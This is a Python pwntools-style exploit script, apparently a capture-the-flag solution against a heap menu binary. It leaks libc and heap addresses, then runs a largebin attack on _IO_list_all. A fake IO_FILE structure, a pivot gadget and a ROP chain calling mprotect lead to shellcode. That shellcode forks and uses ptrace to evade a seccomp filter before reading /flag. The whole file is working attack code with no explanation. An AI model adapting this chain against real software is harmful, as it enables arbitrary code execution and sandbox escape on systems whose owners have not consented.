#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b">")
    sl(i2b(choice))


def add(idx, size):
    cmd(1)
    ru(b"Index: ")
    sl(i2b(idx))
    ru(b"Size: ")
    sl(i2b(size))


def delet(idx):
    cmd(2)
    ru(b"Index: ")
    sl(i2b(idx))


def edit(idx, data):
    cmd(3)
    ru(b"Index: ")
    sl(i2b(idx))
    ru(b"Content: ")
    s(data)


def show(idx):
    cmd(4)
    ru(b"Index: ")
    sl(i2b(idx))


add(0, 0x510)
add(1, 0x900)
add(2, 0x520)
add(3, 0x900)
delet(2)
add(4, 0x900)
delet(0)

show(2)
libc_base = u64_ex(ru(b"\n", drop=True)) - 0x1F70F0
lg("libc_base", libc_base)
edit(2, b"a" * 0x10)
show(2)
ru(b"a" * 0x10)
heap_base = u64_ex(ru(b"\n", drop=True)) - 0x10C0
lg("heap_base", heap_base)

edit(
    2,
    flat(
        {
            0: [
                libc_base + 0x1F70F0,
                libc_base + 0x1F70F0,
                heap_base + 0xDC0,
                libc_base + libc.sym._IO_list_all - 0x20,
            ]
        }
    ),
)
add(5, 0x900)

"""
1630aa:>  48 8b 6f 48          >  mov    rbp,QWORD PTR [rdi+0x48]
1630ae:>  48 8b 45 18          >  mov    rax,QWORD PTR [rbp+0x18]
1630b2:>  4c 8d 6d 10          >  lea    r13,[rbp+0x10]
1630b6:>  c7 45 10 00 00 00 00 >  mov    DWORD PTR [rbp+0x10],0x0
1630bd:>  4c 89 ef             >  mov    rdi,r13
1630c0:>  ff 50 28             >  call   QWORD PTR [rax+0x28]
"""
magic_gadget = libc_base + 0x1630AA
leave_ret = libc_base + 0x0000000000050877
add_rsp_0x38_ret = libc_base + 0x0000000000054BF4
pop_rdi_ret = libc_base + 0x0000000000023B65
pop_rsi_ret = libc_base + 0x00000000000251BE
pop_rdx_ret = libc_base + 0x0000000000166262
pop_rax_ret = libc_base + 0x000000000003FA43

_lock = libc_base + 0x1F8A10
_IO_wfile_jumps = libc_base + libc.sym._IO_wfile_jumps
fake_IO_FILE = heap_base + 0x290

f1 = IO_FILE_plus_struct()
f1.flags = u64_ex("  sh;")
f1._lock = _lock
f1._wide_data = fake_IO_FILE + 0xE0
f1._mode = 1
f1.vtable = _IO_wfile_jumps

f1._IO_save_base = fake_IO_FILE + 0x510 + 0x100

payload = flat(
    {
        0: {
            0: bytes(f1)[0x10:],
            0xE0 - 0x10: {
                0x18: [0],
                0x30: [0],
                0xE0: [fake_IO_FILE + 0x200],
            },
            0x200 - 0x10: {0x68: [magic_gadget]},
        },
    }
)
edit(0, payload)

first_state = f"""
    mov rdi, 0;
    mov rsi, {heap_base + 0x1000};
    mov rdx, 0x1000;
    mov eax, 0;
    syscall;

    mov rax, {heap_base + 0x1000};
    call rax;
"""

edit(3, asm(first_state))

payload = flat(
    {
        0: {
            0: b"a" * 0x10,
            0x100 - 0x20: {
                0: [0xDEADBEEF, add_rsp_0x38_ret],
                0x18: [fake_IO_FILE + 0x520 + 0x100],
                0x28: [leave_ret],
                0x38: [
                    leave_ret,
                    fake_IO_FILE + 0x520 + 0x200,
                    pop_rdi_ret,
                    heap_base,
                    pop_rsi_ret,
                    0x21000,
                    pop_rdx_ret,
                    7,
                    libc_base + libc.sym.mprotect,
                    heap_base + 0x15F0 + 0x10,
                ],
            },
        },
    }
)
edit(1, payload)
lg("magic_gadget", magic_gadget)

cmd(5)

NR_fork = 57
NR_ptrace = 101
NR_wait = 61
PTRACE_ATTACH = 16
PTRACE_SETOPTIONS = 0x4200
PTRACE_O_TRACESECCOMP = 0x00000080
PTRACE_CONT = 7
PTRACE_DETACH = 17
shellcode = f"""
main:
/*fork()*/
    push {NR_fork}
    pop rax
    syscall
    push rax
    pop rbx
    test rax,rax
    jz child_code

/*ptrace(PTRACE_ATTACH, pid, NULL, NULL)*/
    xor r10, r10
    xor edx, edx
    mov rsi,rbx
    mov rdi,{PTRACE_ATTACH}
    push {NR_ptrace}
    pop rax
    syscall

    /* wait child  */
    xor rdi, rdi
    push {NR_wait}
    pop rax
    syscall

/* ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESECCOMP) */
    mov r10,{PTRACE_O_TRACESECCOMP}
    xor rdx, rdx
    mov rsi,rbx
    mov rdi, 0x4200
    push {NR_ptrace}
    pop rax
    syscall

    /* ptrace(PTRACE_CONT, pid, NULL, NULL) */
    xor r10,r10
    xor rdx,rdx
    mov rsi,rbx
    mov rdi, {PTRACE_CONT}  /* PTRACE_CONT */
    push {NR_ptrace}
    pop rax
    syscall

    /* Wait seccomp  */
    xor rdi, rdi
    push {NR_wait}
    pop rax
    syscall

    xor r10,r10
    xor rdx,rdx
    mov rsi,rbx
    mov rdi,{PTRACE_DETACH}
    push {NR_ptrace}
    pop rax
    syscall
    hlt

child_code:
"""

s(asm(shellcode) + asm(shellcraft.cat("/flag")))

ia()
